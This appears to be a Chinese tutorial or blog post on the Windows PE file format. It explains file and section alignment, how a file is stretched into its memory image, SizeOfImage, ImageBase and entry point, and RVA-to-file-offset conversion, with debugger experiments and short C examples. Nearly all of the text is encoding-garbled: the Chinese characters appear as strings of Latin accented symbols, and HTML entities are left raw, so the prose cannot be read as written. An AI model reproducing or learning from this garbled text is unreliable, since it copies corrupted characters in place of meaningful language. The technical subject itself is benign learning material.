ä¹‹é—´çš„é—´éš™ï¼Œä¼šå¡«å……ä¸€äº›æ— æ•ˆçš„å­—èŠ‚ï¼ˆpaddingï¼‰ã€‚ åœ¨å­¦ä¹ å¯¹é½çš„è¿‡ç¨‹ä¸­ï¼Œä¼šçœ‹åˆ°å¤šç§è¯´æ³•ï¼š xxå¯¹é½äºxx xxçš„èµ·å§‹åœ°å€èƒ½æ•´é™¤äºxx xxçš„å¤§å°èƒ½æ•´é™¤äºxx å…¶å®åªè¦æŒ‰ä¸€æ¡åŸºæœ¬çš„æ¦‚å¿µå°±èƒ½æ¨å¯¼å‡ºå…¶ä»–çš„è¯´æ³•ã€‚ FileAlignmentï¼šPEæ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„åŒºå—å¯¹é½å€¼ã€‚ SizeOfHeadersï¼šDOSå¤´+PEå¤´+èŠ‚è¡¨ï¼ŒæŒ‰ç…§FileAlignmentå¯¹é½åçš„æ€»å¤§å°ã€‚ PointerToRawDataï¼šæ–‡ä»¶ä¸­æŸä¸ªåŒºå—åœ¨ç£ç›˜ä¸Šçš„èµ·å§‹åç§»åœ°å€ã€‚ SizeofRawDataï¼šç£ç›˜ä¸ŠæŸä¸ªåŒºå—å¯¹é½åçš„å®é™…å¤§å°ã€‚ åŸºäºåŒºå—èµ·å§‹åœ°å€éœ€è¦å¯¹é½ï¼Œå³åŒºå—èµ·å§‹åœ°å€æ˜¯æ–‡ä»¶å¯¹é½/å†…å­˜å¯¹é½çš„æ•´æ•°å€è¿™ä¸€åŸºæœ¬æ¦‚å¿µï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹æ¨è®ºï¼š ç”±äºPEæ–‡ä»¶ç¬¬ä¸€ä¸ªèŠ‚çš„æ•°æ®èµ·å§‹åœ°å€éœ€è¦æ ¹æ®FileAlignmentè¿›è¡Œå¯¹é½ï¼Œå¯ä»¥æ¨æ–­å‡ºï¼š DOSå¤´+PEå¤´+èŠ‚è¡¨ä¸ç¬¬ä¸€ä¸ªèŠ‚çš„èŠ‚æ•°æ®ä¹‹é—´ï¼ˆå¯èƒ½ï¼‰è¦æœ‰å¡«å…… è¿›ä¸€æ­¥æ¨å¯¼å‡ºSizeOfHeadersï¼ˆå³DOSå¤´+PEå¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„æ€»å¤§å°ï¼‰å¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ã€‚ åŒæ ·åœ°ï¼Œç”±äºæ–‡ä»¶ä¸­ç¬¬äºŒä¸ªèŠ‚çš„èµ·å§‹åœ°å€ä¹Ÿéœ€è¦å¯¹é½ï¼Œå¯ä»¥æ¨æ–­å‡ºï¼š åœ¨ç¬¬ä¸€ä¸ªèŠ‚çš„æ•°æ®ç»“æŸåå’Œç¬¬äºŒä¸ªèŠ‚çš„æ•°æ®å¼€å§‹å‰ä¹‹é—´æœ‰å¡«å…… è¿›ä¸€æ­¥æ¨å¯¼å‡ºç¬¬ä¸€ä¸ªèŠ‚çš„SizeofRawDataï¼ˆå³è¯¥èŠ‚åœ¨ç£ç›˜ä¸Šå¯¹é½åçš„å¤§å°ï¼‰æ˜¯FileAlignmentçš„æ•´æ•°å€ã€‚ â€¦ ç¬¬nä¸ªèŠ‚æ•°æ®ï¼ŒPEåœ¨å†…å­˜ä¸­æŒ‰å†…å­˜å¯¹é½åŒç†ã€‚ FileAlignmentå¯èƒ½å’ŒSectionAlignmentä¸€æ ·æˆ–ä¸ä¸€æ ·åœ¨è®¡ç®—æœºæŠ€æœ¯æ—©æœŸï¼Œç”±äºç¡¬ä»¶æˆæœ¬è¾ƒé«˜ï¼Œç¡¬ç›˜å®¹é‡æœ‰é™ï¼Œæ–‡ä»¶å¯¹é½å€¼ï¼ˆFileAlignmentï¼‰é€šå¸¸è®¾å®šä¸º200hï¼Œç›®çš„æ˜¯ä¸ºäº†èŠ‚çº¦å®è´µçš„ç¡¬ç›˜ç©ºé—´ã€‚éšç€æ—¶é—´çš„æ¨ç§»ï¼Œç¡¬ä»¶æŠ€æœ¯è¿›æ­¥ï¼Œäººä»¬å¯¹ç¡¬ç›˜ç©ºé—´çš„å…³æ³¨å‡å°‘ï¼Œç¼–è¯‘ç”Ÿæˆçš„exeæ–‡ä»¶çš„æ–‡ä»¶å¯¹é½å€¼æå‡åˆ°äº†1000hã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå½“exeæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œå…¶æ–‡ä»¶å¯¹é½å€¼ç­‰äºèŠ‚å¯¹é½å€¼ï¼ˆSectionAlignmentï¼‰ï¼Œé¿å…äº†å†…å­˜åŠ è½½æ—¶çš„æ‹‰ä¼¸è¿‡ç¨‹ï¼Œä»è€Œæé«˜äº†ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ã€‚è¿™ç§åšæ³•ä»¥ç‰ºç‰²ä¸€å®šçš„ç¡¬ç›˜ç©ºé—´ä¸ºä»£ä»·ï¼Œæå‡äº†ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ï¼Œä»¥ç©ºé—´æ¢å–äº†æ—¶é—´ã€‚ æ¨¡å—ä¸æ¨¡å—ä¹‹é—´çš„å¯¹é½ ODï¼Œç‚¹å‡»EæŒ‰é’®ã€‚å¯ä»¥çœ‹åˆ°ä¸€ä¸ªexeè¿›ç¨‹ç©ºé—´ä¸­åŠ è½½çš„æ¨¡å—ã€‚å¯¹é½ï¼Œä¸ä»…ä½“ç°åœ¨ä¸€ä¸ªPEæ–‡ä»¶å†…éƒ¨çš„å¯¹é½ï¼ŒPEæ–‡ä»¶ä¸PEæ–‡ä»¶ä¹‹é—´ä¹Ÿæœ‰å¯¹é½ã€‚æ¨¡å—ä¸æ¨¡å—ä¹‹é—´çš„å¯¹é½å€¼ä¸º10000hï¼Œå³64kã€‚ è§‚æµ‹ä¸‹64kå¯¹é½ç”¨ODæ‹–è¿›32ä½çš„notepadï¼Œæ‰¾äº†ä¸¤ä¸ªç›¸é‚»çš„æ¨¡å—æ¨¡å—ååŸºå€å¤§å°åŸºå€+å¤§å°IMM3275610000h26000h75636000hgdi32ful75640000hæ¨¡å—IMM32æœ«å°¾åœ°å€75636000hå’Œä¸‹ä¸€ä¸ªæ¨¡å—gdi32fulåŸºå€75640000hï¼Œä¹‹é—´ï¼Œå¡«å……äº†4000hã€‚å‘ç°æ¨¡å—ä¸€å’Œæ¨¡å—äºŒä¹‹é—´ç¡®å®æ˜¯æŒ‰64kå¯¹é½ï¼Œå³10000hã€‚æ¢ä¸ªçœ‹æ³•ï¼Œæ¨¡å—IMM32å’Œæ¨¡å—gdi32fulçš„åŸºå€ä¹Ÿæ˜¯10000hçš„æ•´æ•°å€ã€‚ä½†ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¯¹é½å€¼æ˜¯64kï¼Œæ„Ÿè§‰åƒä¸ªé­”æ•°ï¼ˆmagic numberï¼‰ã€‚ç”¨æ®µå¼å’Œé¡µå¼ç®¡ç†çš„çŸ¥è¯†ä¹Ÿä¸æ¸…æ¥šæ€ä¹ˆå‡‘å‡º64kè¿™ä¸ªæ•°ã€‚ â€œæ‹‰ä¼¸â€çš„åŒé‡å«ä¹‰ ä¸ªäººå¯¹æ‹‰ä¼¸å«ä¹‰è¿›è¡Œæ‰©å……ï¼Œè¿™æ˜¯åšFileBufferToImageBufferé‚£ä¸ªå‡½æ•°æ—¶å‘ç°çš„ï¼Œæˆ‘è®¤ä¸ºæŠŠè¿™ä¸ªçŸ¥è¯†ç‚¹åŠ åœ¨è¿™é‡Œæ¯”è¾ƒå¥½ ç¬¬ä¸€é‡ï¼šPEæ–‡ä»¶åœ¨ç£ç›˜ä¸Šï¼Œå¯¹é½äºFileAlignmentï¼Œåœ¨å†…å­˜ä¸­ï¼Œå¯¹é½äºSectionAlignmentã€‚å› ä¸ºä¸¤è€…çš„å·®å¼‚ï¼Œå½“ä¸€ä¸ªPEæ–‡ä»¶ç”±ç£ç›˜è½½å…¥åˆ°å†…å­˜ï¼Œéœ€è¦åšâ€œæ‹‰ä¼¸â€ã€‚ ç¬¬äºŒé‡ï¼šèŠ‚æ•°æ®ä¸­æœªåˆå§‹åŒ–æ•°æ®çš„â€œæ‹‰ä¼¸â€å±•å¼€ã€‚å¦‚æœä¸€ä¸ªPEæ–‡ä»¶ä¸­çš„æŸä¸ªèŠ‚æ•°æ®å› ä¸ºå«æœ‰æœªåˆå§‹åŒ–çš„æ•°æ®ï¼ˆå¦‚.bssèŠ‚ï¼Œæˆ–.bsså·²åˆå¹¶åˆ°.dataèŠ‚ä¸­ï¼‰å¯¼è‡´å‡ºç°VitrualSize&gt;SizeOfRawDataçš„æƒ…å†µã€‚è¿™éƒ¨åˆ†æœªåˆå§‹åŒ–çš„æ•°æ®åœ¨æ–‡ä»¶ä¸­ä¸å ç”¨ç©ºé—´ï¼Œè€Œåœ¨å†…å­˜ä¸­è¦å æœ‰ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è¯´ç³»ç»ŸåŠ è½½å™¨åœ¨å†…å­˜ä¸­è¦ç»™è¿™äº›æœªåˆå§‹åŒ–çš„æ•°æ®ï¼Œåˆ†ç©ºé—´ï¼Œè¿™æ ·ä¼šä½¿ImageBuferçš„å¤§å°&gt;FileBufferçš„å¤§å°ï¼Œä¹Ÿå¯¼è‡´äº†â€œæ‹‰ä¼¸â€ æ€è€ƒè¿‡ç¨‹è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœä¸€ä¸ªPEæ–‡ä»¶FileAlignment==SectionAlignmentï¼Œæ˜¯å¦å°±ä¸éœ€è¦â€œæ‹‰ä¼¸â€äº†ï¼Œè½½å…¥å†…å­˜æ—¶çš„ImageBuferæ˜¯å¦å°±å’Œæ–‡ä»¶FileBufferä¸€æ ·äº†ï¼Ÿä¾‹1ï¼šé£é¸½ç¨‹åºä¾‹2ï¼šVSç¼–è¯‘å‡ºçš„Hello Worldç¨‹åºä¾‹3ï¼šVCç¼–è¯‘å‡ºçš„Hello Worldç¨‹åºé£é¸½çš„FileAlignmentå’ŒSectionAlignmentéƒ½æ˜¯1000hã€‚ç„¶åæˆ‘ä»¬çœ‹èŠ‚è¡¨ï¼Œè§‚å¯Ÿå®ƒå„ä¸ªèŠ‚çš„ä¿¡æ¯4ä¸ªèŠ‚çš„VirtualSizeå‡&lt;SizeOfRawDataï¼Œ4ä¸ªèŠ‚çš„VirtualAddress==PointerToRawDataã€‚è¿™è¯´æ˜ImageBufferæ²¡æœ‰ä¸€ç‚¹æ‹‰ä¼¸ï¼ŒImageBufferçš„å¤§å°å’ŒFileBufferå¤§å°ä¸€æ ·ã€‚é€šè¿‡SizeOfImageå­—æ®µå¯ä»¥éªŒè¯çŒœæƒ³ï¼šç”¨VSç¼–è¯‘å¦‚ä¸‹ä»£ç ç”Ÿæˆçš„exeï¼Œè¿™ä¸ªexeä¸­æœ‰ä¸€ä¸ªå®Œå…¨ä¸å ç£ç›˜ç©ºé—´çš„èŠ‚ã€‚1234567#include &lt;stdio.h&gt;int main()&#123;\tprintf(&quot;Hello World! &quot;);\treturn 0;&#125;.textbssèŠ‚ï¼Œæ–‡ä»¶ä¸­èµ·å§‹åœ°å€PointerToRawDataä¸º0ï¼ŒSizeOfRawDataä¸º0ã€‚ä½†åˆ°å†…å­˜ä¸­è¿™ä¸ªèŠ‚è¦ç”¨10000hå¤§å°çš„ç©ºé—´ï¼Œç¼–è¯‘å™¨ç¼–è¯‘æ—¶å°±ç®—å¥½äº†æ¯ä¸ªèŠ‚çš„VirtualAddressï¼Œåœ¨è¿™é‡Œä¾‹å­ä¸­å°±æ˜¯åˆ’å®šäº†ä»å†…å­˜VirtualAddress(1000h)å¼€å§‹ï¼Œç»™é‚£ä¹ˆå¤šçš„ç©ºé—´ç»™.textbssèŠ‚ç”¨ã€‚éšåä¸‹ä¸€ä¸ªèŠ‚ï¼Œ.textèŠ‚ä»VirtualAddressï¼ˆ11000hï¼‰ä½œä¸ºèµ·å§‹åœ°å€ã€‚ä½ çœ‹ï¼Œè¿™æ˜¯å› ä¸ºå«æœ‰æœªåˆå§‹åŒ–æ•°æ®ï¼Œåœ¨æ–‡ä»¶ä¸­ä¸å ç”¨ç©ºé—´ï¼Œä½†æ˜¯åˆ°å†…å­˜ä¸­ï¼Œéœ€è¦åˆ†é…å¤§å°ç»™è¿™äº›æ•°æ®ï¼Œè€Œå¯¼è‡´çš„æ‹‰ä¼¸ã€‚ä¸è¿‡è¿™ä¸ªexeçš„FileAlignmentæ˜¯200hï¼ŒSectionAlignmentæ˜¯1000hï¼Œå¦‚æœç›¸ç­‰ï¼Œè¿™ä¸ªä¾‹å­å°±å®Œç¾äº†ï¼Œèƒ½çœ‹å‡ºå› ä¸ºèŠ‚è€Œå¯¼è‡´çš„â€œæ‹‰ä¼¸â€ã€‚æ›´å¸¸è§çš„æƒ…å†µï¼Œæ˜¯åé¢çš„ä¾‹3ï¼Œ.bssèŠ‚çš„æ•°æ®åˆå¹¶åˆ°å¦ä¸€ä¸ªèŠ‚ä¸­ï¼Œå¯¼è‡´é‚£ä¸ªèŠ‚çš„Misc&gt;SizeOfRawDataï¼Œå³å†…å­˜å®é™…è¦ç”¨çš„ç©ºé—´æ¯”åœ¨ç£ç›˜ä¸Šçš„å¤šã€‚ç”¨VC6ç¼–è¯‘å¦‚ä¸‹ä»£ç ç”Ÿæˆçš„exeï¼ŒFileAlignmentå’ŒSectionAlignmentéƒ½æ˜¯1000hã€‚ç„¶åæˆ‘ä»¬çœ‹èŠ‚è¡¨ï¼Œè§‚å¯Ÿå®ƒå„ä¸ªèŠ‚çš„ä¿¡æ¯1234567#include &lt;stdio.h&gt;int main()&#123;\tprintf(&quot;Hello World! &quot;);\treturn 0;&#125;ä¾æ¬¡ä»ä¸Šå¾€ä¸‹çœ‹ï¼Œ.textèŠ‚ã€.rdataèŠ‚çš„VirtualSize&lt;SizeOfRawDataï¼Œå› æ­¤VitrualAddresså’ŒPointerToRawDataä¸€æ ·ã€‚ä½†æ˜¯.dataèŠ‚ï¼Œç”±äºVirtualSize&gt;SizeOfRawDataï¼Œå¯¼è‡´.idataèŠ‚çš„VirtualSizeå°±æ¯”PointerToRawDataå¤§äº†ã€‚ï¼ˆå› ä¸º.dataå çš„åœ°æ›´å¤šäº†ï¼Œå¯¼è‡´.dataçš„èŠ‚æ•°æ®èµ·å§‹åœ°å€å°±å˜é«˜äº†ã€‚ï¼‰å¹¶ä¸”ä¼šæŒç»­å½±å“åˆ°åé¢èŠ‚çš„èµ·å§‹åœ°å€ã€‚å³ä½¿.relocèŠ‚çš„VirtualSize&lt;SizeOfRawDataï¼Œ.relocèŠ‚æ•°æ®çš„VirtualAddressè¿˜æ˜¯&gt;PointerToRawDataã€‚ç°åœ¨ç”¨æœ€åä¸€ä¸ªèŠ‚.relocçš„èµ·å§‹åœ°å€VirtualAddressï¼Œ2B000+SizeOfRawDataï¼ŒæŒ‰å†…å­˜å¯¹é½ï¼Œå¾—åˆ°çš„å€¼æ˜¯2C000ï¼Œä¹Ÿå°±æ˜¯è¯´ImageBufferçš„å¤§å°è‡³å°‘æ˜¯2C000ã€‚ç”¨PE Toolçœ‹ä¸‹SizeOfImageå­—æ®µï¼šåˆšå¥½æ˜¯2C000æ¯”æ–‡ä»¶å¤§å°çš„å€¼å¤§ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶çš„FileAlignment=SectionAlignmentï¼Œä½†ä»FileBuffer-&gt;ImageBufferè¿˜æ˜¯æ‹‰ä¼¸äº†ï¼Œå› ä¸ºæŸäº›èŠ‚å«æœ‰æœªåˆå§‹åŒ–æ•°æ®çš„å¯¼è‡´Misc&gt;SizeOfRawDataçš„åŸå› ã€‚ ä¸€äº›å­—æ®µ SizeOfImageçš„å¤§å°â‰¥æœ€åä¸€ä¸ªèŠ‚.VirtualAddress+max&#123;Misc,SizeOfRawData&#125;æŒ‰å†…å­˜å¯¹é½åçš„å€¼ è¦ä¸è¿™ä¸ªPEæ–‡ä»¶è½½å…¥å†…å­˜æ—¶å› ä¸ºç©ºé—´å¤§å°ç”³è¯·é”™è¯¯ï¼Œæ²¡æ³•æ‹‰ä¼¸ï¼Œä¹Ÿå°±æ²¡æ³•è¿è¡Œ å®éªŒï¼šæ”¹è¿™ä¸ªå€¼é»˜è®¤ï¼Œæœªä¿®æ”¹æ”¹å¤§æ”¹å°é»˜è®¤æ˜¯2C000ç”±2C000æ”¹å¤§ï¼Œæ”¹ä¸º2D000ç”±2C000æ”¹å°ï¼Œæ”¹ä¸º2B000 ImageBase+AddressOfEntryPoint æ‰©å±•PEå¤´ä¸­æœ‰ä¸¤ä¸ªå­—æ®µï¼š AddressOfEntryPointï¼šç¨‹åºæ‰§è¡Œå…¥å£RVAï¼ŒæŒ‡PEæ–‡ä»¶åœ¨å†…å­˜æ‹‰ä¼¸å±•å¼€åï¼Œç¨‹åºä»å“ªä¸ªåœ°å€å¼€å§‹æ‰§è¡Œã€‚è¿™ä¸ªå€¼æ˜¯ç›¸å¯¹äºImageBaseçš„åç§»ã€‚ ImageBaseï¼šå†…å­˜é•œåƒåŸºå€ã€‚æŒ‡PEæ–‡ä»¶åœ¨å†…å­˜ä¸­é¦–é€‰åœ¨å“ªä¸ªåœ°å€å¼€å§‹è½½å…¥æ‹‰ä¼¸ã€‚ å½“ç”¨æˆ·åŒå‡»ä¸€ä¸ªPEæ–‡ä»¶ä»¥è¿è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„4GBçš„åœ°å€ç©ºé—´ï¼Œå…¶ä¸­ä¸ŠåŠéƒ¨åˆ†ï¼ˆé«˜2GBï¼‰æ˜¯ç”±æ“ä½œç³»ç»Ÿæ‰€ä½¿ç”¨ï¼Œè€Œä¸‹åŠéƒ¨åˆ†ï¼ˆä½2GBï¼‰æ˜¯åˆ†é…ç»™ç”¨æˆ·ç©ºé—´çš„ã€‚ç¨‹åºæ˜¯æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿæ‰€å ç”¨çš„é«˜2GBç©ºé—´çš„ã€‚åœ¨è¿›ç¨‹åˆ›å»ºæ—¶ï¼ŒImageBaseå­—æ®µå®šä¹‰äº†PEæ–‡ä»¶åº”å½“ä»å“ªä¸ªå†…å­˜åœ°å€å¼€å§‹è¢«åŠ è½½å’Œæ˜ å°„ã€‚ä¸€æ—¦ç³»ç»ŸåŠ è½½å™¨å®Œæˆäº†åŠ è½½å’Œæ˜ å°„å·¥ä½œï¼Œå®ƒä¼šæ ¹æ®PEæ–‡ä»¶ä¸­çš„AddressOfEntryPointå­—æ®µæŒ‡å®šçš„ä½ç½®ï¼Œè·³è½¬åˆ°ä»£ç åŒºå¹¶å¼€å§‹æ‰§è¡Œç¨‹åºä»£ç ã€‚ ä¸€ä¸ªPEæ–‡ä»¶åŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­ï¼ŒImageBaseå¯èƒ½è¢«å…¶ä»–PEæ–‡ä»¶å ç”¨ï¼Œé‚£å°±è¦æ¢ä¸€ä¸ªåœ°å€è½½å…¥ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸€äº›å€¼æ¯”å¦‚AddressOfEntryPointæ˜¯è®¾è®¡æˆç›¸å¯¹äºImageBaseçš„åç§»ï¼Œè€Œä¸èƒ½ç›´æ¥å†™æˆç»å¯¹åœ°å€VAã€‚ å®éªŒ ç”¨åå…­è¿›åˆ¶ç¼–è¯‘å™¨æŸ¥çœ‹xpç³»ç»Ÿä¸‹notepadçš„AddressOfEntryPointå’ŒImageBaseå­—æ®µã€‚ä¸¤è€…ä¸¤åŠ ï¼š01000000+0000739D=0100739Dã€‚éšåç”¨ODè½½å…¥notepadï¼Œçœ‹ODåœä¸‹çš„OEPæ˜¯å¦æ˜¯åˆšæ‰ç®—å‡ºçš„å€¼ã€‚ 3ä¸ªåœ°å€ä¹‹é—´çš„è½¬æ¢ è™šæ‹Ÿåœ°å€ï¼ˆVAï¼ŒVirtual Address)ï¼šPEæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜åçš„ç»å¯¹åœ°å€ ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼ŒRelative Virtual Addressï¼‰ï¼šç›¸å¯¹äºåŸºåœ°å€ImageBaseçš„åç§»é‡ æ˜ åƒåŸºå€/åŸºåœ°å€ï¼ˆImageBaseï¼‰ï¼šPEæ–‡ä»¶åœ¨å†…å­˜æ˜ åƒä¸­çš„èµ·å§‹åœ°å€ æ–‡ä»¶åç§»åœ°å€ï¼ˆFOAï¼ŒFile Offset Addressï¼‰ï¼šç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»é‡ï¼Œæ–‡ä»¶å¤´èµ·å§‹å€¼ä¸º0 RVAå’ŒVAçš„è½¬æ¢ PEæ–‡ä»¶ä»å†…å­˜ä¸­çš„ImageBaseå¼€å§‹è½½å…¥ã€‚VA-ImageBaseå¾—åˆ°çš„å°±æ˜¯è¿™ä¸ªæ•°æ®ç›¸å¯¹äºImageBaseçš„åç§»é‡ RVA=VA-ImageBase RVAå’ŒFOAçš„è½¬æ¢ RVAè½¬FOA è®¡ç®—æ–¹æ³•ä¸€ï¼šç®—å‡ºè¯¥æ•°æ®è·ç¦»æ‰€åœ¨èŠ‚çš„åç§»ï¼Œå†åŠ ä¸ŠèŠ‚.PointerToRawData å¦‚æœæ–‡ä»¶å¯¹é½å€¼å’Œå†…å­˜å¯¹é½å€¼ä¸€æ ·ï¼ŒåŒä¸€æ•°æ®åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„åç§»å’Œåœ¨å†…å­˜ä¸­çš„åç§»ç›¸åŒï¼Œå°±ä¸ç”¨è½¬æ¢ã€‚ å¦‚æœæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½å€¼çš„ä¸åŒï¼Œä¼šå‡ºç°FOA(æ–‡ä»¶åç§»åœ°å€)å’ŒVA(è™šæ‹Ÿåœ°å€)çš„è½¬æ¢é—®é¢˜ã€‚ å› ä¸ºPEæ–‡ä»¶ä¸­çš„åŒºå—æœ‰å¯¹é½è¦æ±‚ \\qquad=&gt;DOS+PEå¤´+èŠ‚è¡¨ä¸ç¬¬ä¸€ä¸ªèŠ‚çš„æ•°æ®ä¹‹é—´æœ‰å¡«å……ï¼›èŠ‚æ•°æ®ä¸èŠ‚æ•°æ®ä¹‹é—´æœ‰å¡«å…… \\qquad=&gt;DOS+PEå¤´+èŠ‚è¡¨ï¼ŒèŠ‚æ•°æ®å†…éƒ¨æ²¡æœ‰å¡«å…… åˆ©ç”¨å†…éƒ¨æ²¡æœ‰å¡«å……è¿™ä¸€ç‰¹ç‚¹ï¼Œæˆ‘ä»¬ç®—å‡ºæŸæ•°æ®è·ç¦»å®ƒæ‰€åœ¨èŠ‚çš„åç§»ï¼šæŸæ•°æ®RVA-è¯¥æ•°æ®æ‰€åœ¨èŠ‚.VirtualAddressã€‚ éšåï¼Œè¯¥æ•°æ®çš„FOAå°±æ˜¯ï¼šè¯¥æ•°æ®æ‰€åœ¨èŠ‚.PointerToRawData+æŸæ•°æ®è·ç¦»å®ƒæ‰€åœ¨èŠ‚çš„åç§» å³æŸæ•°æ®çš„FOAæ–‡ä»¶åç§» = è¯¥æ•°æ®æ‰€åœ¨èŠ‚.PointerToRawData+ï¼ˆæŸæ•°æ®çš„RVAâ€“è¯¥æ•°æ®æ‰€åœ¨èŠ‚.VirtualAddressï¼‰ ä»£ç å®ç°è¿‡ç¨‹å¦‚ä¸‹ï¼š æŸæ•°æ®RVAåœ°å€=VAå†…å­˜åœ°å€-ImageBaseåœ°å€ é€šè¿‡RVAåœ°å€åˆ¤æ–­æ˜¯å¦ä½äºPEå¤´ä¸­ï¼š å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆRVA=FOAï¼› å¦‚æœä¸æ˜¯ï¼Œé€šè¿‡è¯¥æ•°æ®çš„RVAä½äºå“ªä¸ªèŠ‚ï¼š é€šè¿‡èŠ‚.VirtualAddress â‰¤ RVAåœ°å€ â‰¤ èŠ‚.VirtualAddress+å½“å‰èŠ‚å†…å­˜å¯¹é½åçš„å¤§å°ï¼Œæ¥åˆ¤æ–­è¯¥æ•°æ®åœ¨å“ªä¸ªèŠ‚ä¸­ å·®å€¼ = RVAåœ°å€-èŠ‚.VirtualAddress FOA = èŠ‚.PointerToRawData+å·®å€¼ è®¡ç®—æ–¹æ³•äºŒï¼šç”¨è¯¥æ•°æ®RVA-æ‰€åœ¨èŠ‚çš„èŠ‚åç§»ï¼ˆå¤šå¡«å……çš„é‡ï¼‰ é€šè¿‡èŠ‚åç§»Î”k\\Delta kÎ”k=èŠ‚.VirtualAddress-èŠ‚.PointerToRawDataæ¥æ¶ˆé™¤è¯¥èŠ‚å‰é¢å› ä¸ºæ–‡ä»¶å¯¹é½å€¼å’Œå†…å­˜å¯¹é½å€¼ä¸ä¸€è‡´å¤šå‡ºæ¥çš„å¡«å……å€¼ã€‚ ä¾‹ å‡è®¾ï¼ŒDOS+PEå¤´+èŠ‚è¡¨ä¸ç¬¬ä¸€ä¸ªèŠ‚çš„æ•°æ®ä¹‹é—´ï¼ŒèŠ‚è¡¨ä¸€æ•°æ®ä¸èŠ‚è¡¨äºŒæ•°æ®ä¹‹é—´ï¼Œåœ¨æ–‡ä»¶ä¸­å®ƒä»¬çš„å¡«å……é—´éš™æ€»å’Œä¸ºxï¼š DOS+PEå¤´+èŠ‚è¡¨ä¸ç¬¬ä¸€ä¸ªèŠ‚çš„æ•°æ®ä¹‹é—´ï¼ŒèŠ‚è¡¨ä¸€æ•°æ®ä¸èŠ‚è¡¨äºŒæ•°æ®ä¹‹é—´ï¼Œåœ¨å†…å­˜ä¸­å®ƒä»¬çš„å¡«å……é—´éš™æ€»å’Œä¸ºyã€‚ é‚£ä¹ˆèŠ‚2.VirtualAddress-èŠ‚2.PointerToRawDataï¼Œå°±èƒ½ç®—å‡ºyæ¯”xå¤šå¡«å……çš„å€¼ã€‚ éšåï¼Œç”¨æŸæ•°æ®çš„RVA-å¤šå¡«å……çš„å€¼ï¼Œå°±æ˜¯æŸæ•°æ®çš„FOA ä¾‹ å·²çŸ¥å…¨å±€å˜é‡çš„VAï¼Œé€šè¿‡PEæ–‡ä»¶æ¥ä¿®æ”¹è¯¥å…¨å±€å˜é‡çš„å€¼ å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡åœ¨PEæ–‡ä»¶ä¸­æœ‰ç©ºé—´ 1234567891011#include &quot;stdafx.h&quot;int g = 0x12345678;int main()&#123; printf(&quot;Address : %p &quot;, &amp;g); printf(&quot;value : 0x%x &quot;, g); return 0;&#125; è¿è¡Œæ‰“å°å‡ºçš„åœ°å€æ˜¯å˜é‡gåœ¨è¿›ç¨‹4GBç©ºé—´ä¸­çš„çº¿æ€§åœ°å€ï¼Œè™šæ‹Ÿåœ°å€VA æ–‡ä»¶å¯¹é½å€¼=å†…å­˜å¯¹é½å€¼æ–‡ä»¶å¯¹é½å€¼â‰ å†…å­˜å¯¹é½å€¼æŸ¥çœ‹FileAlignmentæ–‡ä»¶å¯¹é½å’ŒSectionAlignmentå†…å­˜å¯¹é½å€¼ï¼Œå‘ç°éƒ½æ˜¯0x1000h æŸ¥è¯¥exeçš„ImageBaseï¼Œä¸º00400000ã€‚åˆ™RVA=00424A30-00400000=00024A30 å› ä¸ºæ–‡ä»¶å¯¹é½å€¼=å†…å­˜å¯¹é½å€¼ï¼Œæ‰€ä»¥FOAå’ŒRVAä¸€æ ·ï¼Œå»00024A30æ‰¾è¿™ä¸ªå€¼ï¼Œä¿®æ”¹è¿™ä¸ªå€¼ä¸º0x77777777ï¼Œç„¶åé‡æ–°è¿è¡Œexeã€‚ å¦‚æœç¼–è¯‘å‡ºçš„exeæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½ä¸€æ ·ï¼Œç”¨LordPEå¯¹exeè¿›è¡Œé‡å»ºPEï¼ŒæŠŠå®ƒä»¬å¼„æˆä¸ä¸€æ ·çš„æ‰“å¼€LordPEï¼Œç‚¹å‡»é‡å»ºPEï¼Œé€‰æ‹©Test.exeï¼ŒPEé‡å»ºåŠŸèƒ½ä¸­æœ‰å‹ç¼©æ–‡ä»¶å¤§å°çš„åŠŸèƒ½ï¼Œè¿™é‡Œçš„å‹ç¼©å°±æ˜¯ä¿®æ”¹ç£ç›˜æ–‡ä»¶çš„å¯¹é½å€¼ï¼Œé¿å…è¿‡å¤šåœ°å› å¯¹é½è€Œè¿›è¡Œè¡¥0ï¼Œä½¿å…¶å°‘å ç”¨ç£ç›˜ç©ºé—´ã€‚é‡å»ºåçš„æ–‡ä»¶å¯¹é½æ˜¯200hï¼Œå†…å­˜å¯¹é½æ˜¯1000hã€‚ç”¨VScodeç¼–è¯‘æˆ‘ç”¨VScodeç¼–è¯‘å‡ºçš„exeï¼ŒFileAlignmentæ˜¯200hï¼ŒSectionAlighmentæ˜¯1000hã€‚ æŸ¥è¯¥exeçš„ImageBaseï¼Œä¸º00400000ã€‚åˆ™RVA=00424A30-00400000=00024A30 PEå·¥å…·çœ‹å„ä¸ªåŒºæ®µçš„VirtualAddressï¼Œçœ‹å‡ºæ•°æ®åœ¨.dataåŒºå—ã€‚ 